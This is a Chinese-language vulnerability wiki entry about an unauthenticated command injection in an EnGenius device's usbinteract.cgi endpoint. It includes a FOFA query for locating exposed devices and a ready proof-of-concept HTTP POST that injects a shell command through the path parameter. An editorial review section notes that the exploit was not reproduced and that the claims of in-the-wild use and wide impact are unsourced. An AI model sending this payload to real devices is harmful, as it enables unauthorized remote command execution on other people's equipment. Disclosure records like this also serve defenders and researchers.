---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-7624dd84724e24f7102eb703"
entity_id: "ve-7624dd84724e24f7102eb703"
schema_version: "1"
title: "EnGenius  usbinteract.cgi 存在未授权远程命令执行"
product: "EnGenius EnShare候选"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "仅厂商名，无型号固件；称未认证"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/EnGenius/EnGenius%20%20usbinteract.cgi%20%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
previous_fofa_unverified: "body="
fofa: "body=\"/web/images/guest.png\" && body=\"/web/images/admin.png\""
---

# EnGenius  usbinteract.cgi 存在未授权远程命令执行

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：EnGenius EnShare候选
- 本文讨论：usbinteract.cgi action7/path命令注入
- 版本、权限与配置前提：仅厂商名，无型号固件；称未认证
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- fofa body=截断；在野已知/影响面广没有来源
- 无CVE/厂商公告或修复号
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- EnShare/型号/版本/CVE对应与截图待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

EnGenius  usbinteract.cgi 存在未授权远程命令执行，未授权攻击者可进行任意命令执行。

# 影响版本

EnGenius

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/web/images/guest.png" && body="/web/images/admin.png"

POC/EXP：

```http
POST /web/cgi-bin/usbinteract.cgi HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

action=7&path="|id||"
```


![image-20250307105624337](./.resource/EnGeniususbinteract.cgi存在未授权远程命令执行/media/image-20250307105624337.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
